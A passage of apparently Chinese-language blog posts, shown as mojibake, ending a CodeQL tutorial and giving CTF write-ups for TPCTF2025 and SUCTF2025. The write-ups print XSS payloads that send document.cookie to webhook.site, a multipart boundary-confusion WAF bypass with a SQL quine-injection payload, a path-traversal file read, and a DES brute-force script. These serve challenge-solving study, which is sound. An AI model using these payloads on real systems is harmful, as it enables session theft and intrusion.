åœ¨é‡åˆ°å¤æ‚çš„ç±»å‹æ—¶ï¼Œå¯èƒ½è¦ç”¨å¤šä¸ª exist å­æŸ¥è¯¢è¯­å¥ï¼Œä½†æ˜¯åªç”¨ä¸€ä¸ª instanceof è¯­å¥å°±å¥½ï¼Œè€Œä¸”åªè¦åŒ¹é…ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œå°±èƒ½åŒ¹é…åˆ°è¿™ä¸ªæŠ½è±¡ç±»ä¸‹çš„æ‰€æœ‰å­ç±»ï¼Œæ¯”å¦‚ class MyCustomSource extends RemoteFlowSource å¦‚æœ x ä¸º MyCustomSource ç±»å‹ï¼Œåˆ™ x instanceof RemoteFlowSource ä¼šè¿”å›true ","date":"2025-04-13","objectID":"/posts/28dc684/:6:1","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"é€’å½’\rCodeQLé‡Œé¢çš„é€’å½’è°ƒç”¨è¯­æ³•æ˜¯ï¼šåœ¨è°“è¯æ–¹æ³•çš„åé¢è·Ÿ*æˆ–è€…+ï¼Œæ¥è¡¨ç¤ºè°ƒç”¨0æ¬¡ä»¥ä¸Šå’Œ1æ¬¡ä»¥ä¸Šï¼ˆå’Œæ­£åˆ™ç±»ä¼¼ï¼‰ï¼Œ0æ¬¡ä¼šæ‰“å°è‡ªå·±ã€‚ demo package org.example; public class hello { public class StudentService { class innerOne { public innerOne(){} class innerTwo { public innerTwo(){} public String Nihao() { return \"Nihao\"; } } public String Hi(){ return \"hello\"; } } } } æ­¤æ—¶å¦‚æœæƒ³è¦æ ¹æ®innerTwoç±»å®šä½åˆ°æœ€å¤–å±‚çš„ hello ç±» æˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹ ql æŸ¥è¯¢è¯­å¥æ¥è·å¾—ï¼Œè°ƒç”¨ä¸¤æ¬¡ getEnclosingType æ–¹æ³•å³å¯ import java from Class classes where classes.getName().toString() = \"innerTwo\" select classes.getEnclosingType().getEnclosingType().getEnclosingType() // getEnclosingtypeè·å–ä½œç”¨åŸŸ ä½†æ˜¯å®é™…æƒ…å†µæˆ‘ä»¬ä¸çŸ¥é“è¦è°ƒç”¨å‡ æ¬¡ï¼Œè€Œä¸”è¿™æ ·å†™ä¹Ÿæ¯”è¾ƒéº»çƒ¦ è¿™æ—¶å€™å°±å¯ä»¥ç”¨åˆ°é€’å½’äº†ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨æ–¹æ³•åé¢åŠ *(ä»è‡ªèº«å¼€å§‹è°ƒç”¨)æˆ–è€…+(ä»ä¸Šä¸€çº§å¼€å§‹è°ƒç”¨)ï¼Œæ¥è§£å†³æ­¤é—®é¢˜ã€‚ from Class classes where classes.getName().toString() = \"innerTwo\" select classes.getEnclosingType+() // è·å–ä½œç”¨åŸŸ + æ˜¯ä»ä¸Šä¸€çº§å¼€å§‹è°ƒç”¨ * æ˜¯ä»è‡ªèº«å¼€å§‹è°ƒç”¨ è‡ªå·±å°è£…æ–¹æ³•æ¥å®ç°é€’å½’è°ƒç”¨ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘è¿™åªæƒ³æ‰¾ç›¸å·®ä¸€å±‚çš„ç±» import java RefType demo(Class classes) { result = classes.getEnclosingType().getEnclosingType() } from Class classes where classes.getName().toString() = \"innerTwo\" select demo*(classes) // è·å–ä½œç”¨åŸŸ ","date":"2025-04-13","objectID":"/posts/28dc684/:6:2","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"å¼ºåˆ¶ç±»å‹è½¬æ¢\råœ¨ CodeQL ä¸­å¯ä»¥ç”¨ getType() æ¥å¯¹è¿”å›ç»“æœåšå¼ºåˆ¶ç±»å‹è½¬æ¢ æŸ¥è¯¢ä¸‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„å‚æ•°åŠå…¶ç±»å‹ import java from Parameter param select param, param.getType() å¯ä»¥çœ‹åˆ°æœ‰5kå¤šæ¡è€Œä¸”æœ‰ä¸åŒç±»å‹çš„å‚æ•°ï¼Œå¼ºåˆ¶è½¬æ¢ä¸‹ï¼Œåªç•™ä¸‹æ˜¯æ•´å‹çš„å‚æ•° åªæœ‰1kå¤šæ¡äº†ï¼Œè€Œä¸”åªå«æœ‰æ•´å‹çš„ ","date":"2025-04-13","objectID":"/posts/28dc684/:6:3","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"æ€»ç»“\rç»¼ä¸Šå¯ä»¥çŸ¥é“CodeQLçš„å¼ºå¤§äº†ï¼Œç¨å¾®å…¥äº†ä¸‹é—¨ï¼ŒçŸ¥é“æ€ä¹ˆç”¨äº†ï¼Œéš¾ç‚¹å°±åœ¨äºè§„åˆ™çš„ç¼–å†™ï¼Œæœ€ä¸»è¦çš„å°±æ˜¯sourceï¼Œsinkå’Œä¸­é—´Sanitizerçš„ç¼–å†™ æ¥ä¸‹æ¥å°±æ˜¯æ‰¾æ¡ˆä¾‹æ¥ç»ƒæ‰‹äº† ","date":"2025-04-13","objectID":"/posts/28dc684/:7:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://www.freebuf.com/articles/web/283795.html https://www.ascotbe.com/2024/12/27/CodeQL/ https://drun1baby.top/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ ","date":"2025-04-13","objectID":"/posts/28dc684/:8:0","tags":["Java"],"title":"CodeQLå…¥é—¨","uri":"/posts/28dc684/"},{"categories":["CTF"],"content":"å‰è¨€\ræ¸…ååŒ—å¤§åŠçš„æ¯”èµ›ï¼Œè´¨é‡ä¸ç”¨è´¨ç–‘ï¼ŒMisc çš„è¯æ‰‹æ“äºŒç»´ç çš„æ—¶å€™ä¸€ç›´å¯¹ä¸ä¸Šï¼Œè²Œä¼¼æ˜¯ä¸Šä¸‹é¢ å€’äº†ï¼ŒqrzyboxåŸæ¥è¿˜èƒ½è‡ªåŠ¨è¡¥å…¨ï¼Œç®—æ˜¯å­¦åˆ°äº†ï¼ŒWeb çš„è¯å°±å¤ç°äº†ä¸‹ xss çš„ï¼Œå…¶ä»–é¢˜çœ‹ä¸‹ wp å†è¯´å§ï¼Œé¢˜ç›®åæ‰“ * çš„æ˜¯å¤ç° ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:1:0","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"Web\r","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:0","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"baby layout\ræ€è·¯å¾ˆæ¸…æ¥šï¼Œå¯ä»¥å†™ content å’Œ layout ï¼Œç„¶åbotè®¿é—®æŒ‡å®š url æ—¶ä¼šå°† flag æ³¨å…¥åˆ°è®¿é—®çš„çš„é‚£ä¸ªç½‘é¡µçš„ cookie ä¸­ï¼Œæ‰“ xss å¸¦ cookieã€‚å¯ä»¥çœ‹åˆ°ä»£ç ä¸­å¯¹ content å’Œ layout çš„å†…å®¹éƒ½æ˜¯ç”¨ DOMPurify.sanitize() æ¥è¿›è¡Œäº†ä¸ªè¿‡æ»¤ï¼Œè€Œä¸”å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­çœ‹åˆ° dompurify ç‰ˆæœ¬ä¸º 3.2.4ï¼Œåº”è¯¥ä¸æ˜¯æ‰“ 0day æˆ‘ä»¬è¿™é‡Œé‡ç‚¹çœ‹ä¸‹ content å’Œ layout çš„å®ç° app.post('/api/post', (req, res) =\u003e { const { content, layoutId } = req.body; if (typeof content !== 'string' || typeof layoutId !== 'number') { return res.status(400).send('Invalid params'); } if (content.length \u003e LENGTH_LIMIT) return res.status(400).send('Content too long'); const layout = req.session.layouts[layoutId]; if (layout === undefined) return res.status(400).send('Layout not found'); const sanitizedContent = DOMPurify.sanitize(content); //å°† layout ä¸­çš„ {{content}} æ›¿æ¢ä¸º content çš„å€¼ const body = layout.replace(/\\{\\{content\\}\\}/g, () =\u003e sanitizedContent); if (body.length \u003e LENGTH_LIMIT) return res.status(400).send('Post too long'); const id = randomBytes(16).toString('hex'); posts.set(id, body); req.session.posts.push(id); console.log(`Post ${id} ${Buffer.from(layout).toString('base64')} ${Buffer.from(sanitizedContent).toString('base64')}`); return res.json({ id }); }); app.post('/api/layout', (req, res) =\u003e { const { layout } = req.body; if (typeof layout !== 'string') return res.status(400).send('Invalid param'); if (layout.length \u003e LENGTH_LIMIT) return res.status(400).send('Layout too large'); const sanitizedLayout = DOMPurify.sanitize(layout); const id = req.session.layouts.length; req.session.layouts.push(sanitizedLayout); return res.json({ id }); }); å¯ä»¥çœ‹åˆ°åœ¨ content çš„å®ç°ä¸­æ˜¯å…ˆæ£€æµ‹å†æ›¿æ¢ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°† payload åˆ†ä¸ºä¸¤æ®µï¼Œä¸€æ®µå†™å…¥ layout ï¼Œå¹¶å°†ä¼šè¢«è¿‡æ»¤çš„éƒ¨åˆ†æ›¿æ¢ä¸º {{content}}ï¼Œç¬¬äºŒæ®µå†™å…¥ contentï¼Œå€¼å°±ä¸ºä¼šè¢«è¿‡æ»¤çš„éƒ¨åˆ†ï¼Œè¿™æ ·çš„è¯ content å’Œ layout éƒ½å¯ä»¥ç»•è¿‡ DOMPurify.sanitize() çš„æ£€æµ‹ï¼Œè€Œä¸”ä¹Ÿä¼šå°† content çš„å€¼æ‹¼å…¥ layout ä¸­ï¼Œå½¢æˆæœ€åçš„æ¶æ„ payloadã€‚è€Œä¹‹æ‰€ä»¥ content çš„å€¼ä¸ä¼šè¢«è¿‡æ»¤ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å½¢æˆä¸€ä¸ªå®Œæ•´çš„ html ï¼Œæ²¡è¢«æ£€æµ‹åˆ°ï¼Œå¯ä»¥åœ¨å®˜æ–¹çš„github ä¸Šæ‰¾åˆ°ä¸ª demo æ¥æµ‹è¯•ä¸€ä¸‹ï¼šDOMPurify 3.2.4 â€œShipwreckâ€ å¯ä»¥çœ‹åˆ°ç¬¬äºŒæ¬¡å°±è¢«è¿‡æ»¤äº†è€Œç¬¬ä¸€æ¬¡å´æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå¼¹ä¸ªçª—å…ˆ layout ä¸º \u003caudio src={{content}}\u003e content ä¸º \"a\" onloadstart=\"alert(1)\" create post å°±å¼¹çª—äº† æºç ä¹Ÿå¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸæ’å…¥äº†çš„ å¸¦ä¸‹ cookie \"a\" onloadstart=\"fetch('https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=' + document.cookie)\" åé¢ä¸¤é“åŠ å¼ºé¢˜éƒ½å¯ä»¥å‚è€ƒï¼šhttps://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:1","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout*\råŠ å¼ºäº†è¿‡æ»¤ å°† ALLOWED_ATTR ç½®ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½å¼•ç”¨å±æ€§ï¼Œä½†è·Ÿè¿›åä¼šå‘ç°è¿˜å¯ä»¥ç”¨ ALLOW_DATA_ATTR å’Œ ALLOW_ARIA_ATTR ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¾ç„¶å¯ä»¥ç”¨è‡ªå®šä¹‰çš„ dataï¼Œåæ¥æ¶æ„ä»£ç å³å¯ layout \u003caudio data-a={{content}}\u003e content a\" src=\"a\" onloadstart=\"fetch('https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=' + document.cookie)\" å¿…é¡»æœ‰ src å±æ€§ï¼Œä¸ç„¶ä¼šæŠ¥é”™ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:2","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout revenge*\rè¿™é“å°±ä¿®å¤äº†ä¸Šé¢çš„éé¢„æœŸï¼ŒæŠŠ ALLOW_ARIA_ATTR å’Œ ALLOW_DATA_ATTR éƒ½è®¾ä¸ºäº† false ä» å‡ºé¢˜äººçš„wp ä¸­çœ‹åˆ°dompurifyéå¸¸ä¸¥æ ¼ï¼Œ\u003cstyle\u003eä¸­çš„ä»»ä½•HTMLæ ‡ç­¾éƒ½å°†è¢«è¿‡æ»¤ã€‚ä½†æ˜¯ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä»…æ£€æŸ¥ /\u003c[/\\ w]/ ï¼Œå› æ­¤ä¸ä¼šè¿‡æ»¤ \u003c{{content}} ï¼Œå¯ä»¥ç”¨å…¶æ¥ç»•è¿‡æ¶æ„çš„æ ‡ç­¾ ä½†ä¸èƒ½ç›´æ¥å†™åœ¨ style æ ‡ç­¾é‡Œï¼Œå› ä¸º style æ ‡ç­¾ä¸­çš„ä¼šè¢«å½“ä½œ css è§£æï¼Œæ‰€ä»¥æŠŠ {{content}} åŒ…è£¹åœ¨ style ä¾¿ç­¾é‡Œå³å¯ï¼Œç¬¬ä¸€ä¸ª {{content}} æ˜¯ç”¨æ¥é—­åˆç¬¬ä¸€ä¸ª style æ ‡ç­¾çš„ï¼Œè€Œå‰é¢çš„ a çš„è¯æ˜¯å¼€ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ï¼Œå¹²æ‰°htmlè§£æè§„åˆ™å•¥çš„ï¼Œæ²¡å¤ªæ‡‚ï¼Œä½†æ˜¯ä¸åŠ å°±ä¼šè§£æå¤±è´¥ layout a\u003cstyle\u003e{{content}}\u003c{{content}}\u003c/style\u003e content img src=\"a\" onerror=fetch(`https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=`+document.cookie) \u003cstyle\u003e\u003c/style\u003e ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:3","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"supersqli\rmanage.py åŠ ä¸ªå‚æ•°å¯åŠ¨æœåŠ¡å™¨ï¼Œæ–¹ä¾¿è°ƒè¯• if len(sys.argv) == 1: sys.argv.append(\"runserver\") åœ¨ supersqli\\web_deploy\\src\\blog\\views.py æ–‡ä»¶ä¸­çš„ flag å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨ sql æ³¨å…¥ ä½†æ˜¯ supersqli\\web_deploy\\simplewaf\\main.go ä¸­çš„ waf é™åˆ¶çš„å¾ˆæ­» var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) var hotfixPattern = regexp.MustCompile(`(?i)(select)`) æ³¨æ„åˆ°åœ¨ go ä¸­åŠ äº†ä¸ªåˆ¤æ–­ï¼Œåˆ¤æ–­ mediaType æ˜¯å¦ä¸º multipart/form-data æ‰¾åˆ°ä¸€ç¯‡æœ‰å…³åˆ©ç”¨ multipart/form-data è§£æå·®å¼‚å®ç°ç»•è¿‡çš„æ–‡ç« ï¼šhttps://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/ ä½†æ–‡ç« ä¸­ç”¨çš„æ˜¯ flask æ¡†æ¶ï¼Œè²Œä¼¼åœ¨è¿™é‡Œçš„ Django ä¸­è¡Œä¸é€šï¼Œçœ‹ä¸‹ Django æ¡†æ¶ä¸­å¯¹ multipart/form-data å¤„ç†ï¼Œè·Ÿè¿›åˆ° multipartparser.py ä¸­å¯ä»¥å‘ç° Django æ˜¯é€šè¿‡è¯·æ±‚å¤´ä¸­çš„ Content-Disposition å­—æ®µæ¥åŒºåˆ†æ¯ä¸ªå­—æ®µ è€Œåœ¨ go ä¸­çš„ request.go çš„ multipartReader å‡½æ•°ä¸­ func (r *Request) multipartReader(allowMixed bool) (*multipart.Reader, error) { v := r.Header.Get(\"Content-Type\") if v == \"\" { return nil, ErrNotMultipart } if r.Body == nil { return nil, errors.New(\"missing form body\") } d, params, err := mime.ParseMediaType(v) if err != nil || !(d == \"multipart/form-data\" || allowMixed \u0026\u0026 d == \"multipart/mixed\") { return nil, ErrNotMultipart } boundary, ok := params[\"boundary\"] if !ok { return nil, ErrMissingBoundary } return multipart.NewReader(r.Body, boundary), nil } å¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ç”¨ boundary çš„å€¼æ¥åˆ†éš” multipart è¯·æ±‚ä¸­çš„å„ä¸ªéƒ¨åˆ†ï¼Œæˆªæ­¢ç¬¦çš„è¯å½“ç„¶å°±æ˜¯ boundary çš„å€¼åŠ ä¸Š -- äº† ç»è¿‡ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å‘ç° go å’Œ Django ä¸­ç”¨æ¥åŒºåˆ†ä¸åŒå­—æ®µçš„æ–¹æ³•æ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªè§£æå·®å¼‚æ¥ç»•è¿‡ waf ï¼Œè¯·æ±‚æ˜¯å…ˆç»è¿‡ go å¤„ç†å†ç»è¿‡ Django çš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç”¨ --boundary-- æ¥æˆªæ­¢ï¼Œç„¶åå†ä¼  password çš„å€¼ã€‚å½“è¯·æ±‚ä½“ä¸º Content-Type: multipart/form-data; boundary=----xxx Content-Length: 137 ------xxx Content-Disposition: form-data; name=\"username\" admin ------xxx-- Content-Disposition: form-data; name=\"password\"; 111 go åªä¼šè§£æ ------xxx-- å‰çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¿”å› è¯·æ±‚çš„ POST å‚æ•°: username = admin è€Œ Django åˆ™ä¼šè¿”å›ä¸¤ä¸ªå‚æ•°çš„å€¼ è¯·æ±‚çš„ POST å‚æ•°: username = admin password = 111 åé¢ sql æ³¨å…¥çš„è¯æ˜¯æ‰“ sqliteï¼Œç›²æ³¨ä¸çŸ¥é“ä¸ºå•¥æ‰“ä¸äº†ï¼Œç„¶åå‘ç°èƒ½æ‰“ quine æ³¨å…¥ï¼Œè¿™é‡Œåªåˆ¤æ–­äº†ä¼ å…¥çš„ password æ˜¯å¦ç›¸åŒï¼Œç¡®å®ä¹Ÿæ¯”è¾ƒç¬¦åˆå…¶åˆ©ç”¨åœºæ™¯ï¼Œç”¨æ–‡ç« ä¸­çš„è„šæœ¬æ„é€ ä¸‹ payloadï¼šhttps://blog.csdn.net/qq_35782055/article/details/130348274ï¼Œç¨å¾®æ”¹ä¸‹ï¼Œæ²¡è¿‡æ»¤ç©ºæ ¼ï¼Œä¸ç”¨ repalce ä¸º /**/ sql = input (\"è¾“å…¥ä½ çš„sqlè¯­å¥,ä¸ç”¨å†™å…³é”®æŸ¥è¯¢çš„ä¿¡æ¯ å½¢å¦‚ 1'union select #\\n\") sql2 = sql.replace(\"'\",'\"') base = \"replace(replace('.',char(34),char(39)),char(46),'.')\" final = \"\" def add(string): if (\"--+\" in string): tem = string.split(\"--+\")[0] + base + \"--+\" if (\"#\" in string): tem = string.split(\"#\")[0] + base + \"#\" return tem def patch(string,sql): if (\"--+\" in string): return sql.split(\"--+\")[0] + string + \"--+\" if (\"#\" in string): return sql.split(\"#\")[0] + string + \"#\" res = patch(base.replace(\".\",add(sql2)),sql).replace(\"'.'\",'\".\"') print(res) æœ€åç»å°è¯•å‘ç°æ˜¯ä¸¤åˆ—ï¼Œå› æ­¤ä¼ å…¥ 1' union select 1,2,--+ ï¼Œå¾—åˆ° payload 1' union select 1,2,replace(replace('1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+',char(34),char(39)),char(46),'1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+')--+ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:4","tags":["CTF"],"title":"TPCTF2025éƒ¨åˆ†wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"å‰è¨€\rå¥½å¤šé¢˜ï¼Œè´¨é‡å¾ˆé«˜ï¼Œmiscæ²¡æ€ä¹ˆçœ‹ï¼Œå…¨åœ¨çœ‹webï¼ŒJavaè¿˜æ˜¯æ‰“ä¸åŠ¨ğŸ˜¿ï¼Œè¿˜æœ‰ä¸€äº›å…³äºäº‘çš„ï¼Œä¹Ÿä¸ä¼šï¼Œå…ˆè´´ä¸€ä¸‹å†™äº†çš„wpï¼Œpopå½“æ—¶æ²¡åšï¼Œå…¶ä»–é¢˜ä¹‹åæœ‰ç©ºå¤ç°ä¸€ä¸‹ ","date":"2025-01-14","objectID":"/posts/48766ef/:1:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Misc\r","date":"2025-01-14","objectID":"/posts/48766ef/:2:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_checkin\ræ‰¾åˆ°ä¸ªpasswordï¼šSePassWordLen23SUCT åŠ å¯†æ–¹å¼ï¼šPBEWithMD5AndDES æ„Ÿè§‰hackerè¿™ä¸ªç”¨æˆ·é‡Œçš„å¯†ç å°±æ˜¯ç›ï¼Œä½†æ˜¯çˆ†ç ´å‡ºæ¥æ˜¯ hackerï¼ˆæ€ä¹ˆä¸æ˜¯8ä½ï¼‰ è¿­ä»£æ¬¡æ•°åº”è¯¥æ˜¯é»˜è®¤çš„1000ï¼Œä¸è¡Œçš„è¯çˆ†ç ´ä¹Ÿè¡Œï¼ŒOUTPUTåº”è¯¥å°±æ˜¯å¯†æ–‡ï¼šElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg= åæ¥å‘ç°ä¸ç”¨ç›ä¹Ÿå¯ä»¥è§£å¯†ï¼Œå¯†ç SePassWordLen23SUCTå…¶å®æ˜¯æš—ç¤ºå¯†ç lengthä¸º23ï¼Œå…¶å®åº”è¯¥æ˜¯SUCTFï¼Œç…§ç€åŠ å¯†è„šæœ¬ï¼šhttps://blog.csdn.net/iin729/article/details/128432332ï¼Œå«aiå†™äº†ä¸ªpythonè§£å¯†è„šæœ¬ import base64 import hashlib import re import itertools import string from Crypto.Cipher import DES def get_derived_key(password, salt, count): key = password + salt for i in range(count): m = hashlib.md5(key) key = m.digest() return (key[:8], key[8:]) def decrypt(msg, password): msg_bytes = base64.b64decode(msg) salt = msg_bytes[:8] enc_text = msg_bytes[8:] (dk, iv) = get_derived_key(password, salt, 1000) crypter = DES.new(dk, DES.MODE_CBC, iv) text = crypter.decrypt(enc_text) # Remove padding at the end, if any return re.sub(r'[\\x01-\\x08]', '', text.decode(\"utf-8\", errors=\"ignore\")) def brute_force_decrypt(ciphertext, prefix, length, charset): # Calculate the number of missing characters missing_length = length - len(prefix) # Generate all possible combinations of the missing characters for combination in itertools.product(charset, repeat=missing_length): # Construct the full password password = prefix + ''.join(combination) try: # Attempt to decrypt the ciphertext decrypted_text = decrypt(ciphertext, password.encode(\"utf-8\")) # Check if the decrypted text contains \"SUCTF\" if \"SUCTF\" in decrypted_text: print(f\"Found valid password: {password}\") print(f\"Decrypted text: {decrypted_text}\") return password, decrypted_text except Exception as e: # If decryption fails, just continue to the next combination continue print(\"No valid password found.\") return None, None def main(): # Known prefix of the password prefix = \"SePassWordLen23SUCTF\" # Total length of the password length = 23 # Character set to use for the missing characters (alphanumeric) charset = string.ascii_letters + string.digits # Ciphertext to decrypt ciphertext = \"ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=\" # Start brute-forcing password, decrypted_text = brute_force_decrypt(ciphertext, prefix, length, charset) if password: print(f\"Success! Password: {password}\") print(f\"Decrypted text: {decrypted_text}\") if __name__ == \"__main__\": main() ","date":"2025-01-14","objectID":"/posts/48766ef/:2:1","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_RealCheckin\rhello ctf -\u003e ğŸ ğŸ¦…ğŸ‹ğŸ‹ğŸŠ ğŸˆğŸŒ®ğŸŸ $flag -\u003e ğŸâ˜‚ï¸ğŸˆğŸŒ®ğŸŸ{ğŸ‹ğŸ¦…ğŸ‹ğŸˆğŸŠğŸ”ï¸ğŸ¦…_ğŸŒ®ğŸŠ_ğŸâ˜‚ï¸ğŸˆğŸŒ®ğŸŸ_ğŸ§¶ğŸŠâ˜‚ï¸_ğŸˆğŸğŸŒƒ_ğŸŒˆğŸ¦…ğŸğŸ‹ğŸ‹ğŸ§¶_ğŸ¬ğŸğŸŒƒğŸˆğŸ¦…} $flag å‰äº”ä¸ªä¸ºsuctfï¼Œæ ¹æ®æ˜ å°„å…³ç³»æœ€åå¤§æ‹¬å·é‡Œé¢çš„æ¨æ–­å‡ºæ¥æ˜¯ ? e l c o ? e _ t o _ s u c t f _ ? o u _ c ? ? _ r e ? l l ? _ d ? ? c e å…¶å®ç¬¬ä¸€æ®µå¾ˆæ˜æ˜¾æ˜¯welcomeï¼Œå¯ä»¥å‘ç°è¯¥emojiä»£è¡¨çš„ä¸œè¥¿çš„è‹±æ–‡é¦–å­—æ¯å°±æ˜¯è¯¥emojiä»£è¡¨çš„å­—ç¬¦ï¼Œæ•…æœ€åflagä¸º suctf{welcome_to_suctf_you_can_really_dance} ","date":"2025-01-14","objectID":"/posts/48766ef/:2:2","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Web\r","date":"2025-01-14","objectID":"/posts/48766ef/:3:0","tags":["CTF"],"title":"SUCTF2025éƒ¨åˆ†wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_blog\rarticles ç›®å½•æœ‰ç›®å½•ç©¿è¶Šï¼Œè¯»å¯åŠ¨å‘½ä»¤ï¼ŒåŒå†™ç»•è¿‡ä¸€ä¸‹ article?file=articles/....//....//....//....//....//....//proc/self/cmdline æ‹¿åˆ°pythonapp/app.pyï¼Œæ‹¿æºç  article?file=articles/....//....//app/app.py æºç  from flask import * import time,os,json,hashlib from pydash import set_ from waf import pwaf,cwaf app = Flask(__name__) app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\"testuser\": \"password\"} BASE_DIR = '/var/www/html/myblog/app' articles = { 1: \"articles/article1.txt\", 2: \"articles/article2.txt\", 3: \"articles/article3.txt\" } friend_links = [ {\"name\": \"bkf1sh\", \"url\": \"https://ctf.org.cn/\"}, {\"name\": \"fushuling\", \"url\": \"https://fushuling.com/\"}, {\"name\": \"yulate\", \"url\": \"https://www.yulate.com/\"}, {\"name\": \"zimablue\", \"url\": \"https://www.zimablue.life/\"}, {\"name\": \"baozongwi\", \"url\": \"https://baozongwi.xyz/\"}, ] class User(): def __init__(self): pass user_data = User() @app.route('/') def index(): if 'username' in session: return render_template('blog.html', articles=articles, friend_links=friend_links) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and users[username] == password: session['username'] = username return redirect(url_for('index')) else: return \"Invalid credentials\", 403 return render_template('login.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] users[username] = password return redirect(url_for('login')) return render_template('register.html') @app.route('/change_password', methods=['GET', 'POST']) def change_password(): if 'username' not in session: return redirect(url_for('login')) if request.method == 'POST': old_password = request.form['old_password'] new_password = request.form['new_password'] confirm_password = request.form['confirm_password'] if users[session['username']] != old_password: flash(\"Old password is incorrect\", \"error\") elif new_password != confirm_password: flash(\"New passwords do not match\", \"error\") else: users[session['username']] = new_password flash(\"Password changed successfully\", \"success\") return redirect(url_for('index')) return render_template('change_password.html') @app.route('/friendlinks') def friendlinks(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) return render_template('friendlinks.html', links=friend_links) @app.route('/add_friendlink', methods=['POST']) def add_friendlink(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) name = request.form.get('name') url = request.form.get('url') if name and url: friend_links.append({\"name\": name, \"url\": url}) return redirect(url_for('friendlinks')) @app.route('/delete_friendlink/\u003cint:index\u003e') def delete_friendlink(index): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) if 0 \u003c= index \u003c len(friend_links): del friend_links[index] return redirect(url_for('friendlinks')) @app.route('/article') def article(): if 'username' not in session: return redirect(url_for('login')) file_name = request.args.get('file', '') if not file_name: return render_template('article.html', file_name='', content=\"æœªæä¾›æ–‡ä»¶åã€‚\") blacklist = [\"waf.py\"] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template('article.html', file_name=file_name, content=\"å¤§é»‘é˜”ä¸è®¸çœ‹\") if not file_name.startswith('articles/'): return render_template('article.html', file_name=file_name, content=\"æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\") if file_name not in articles.values(): if 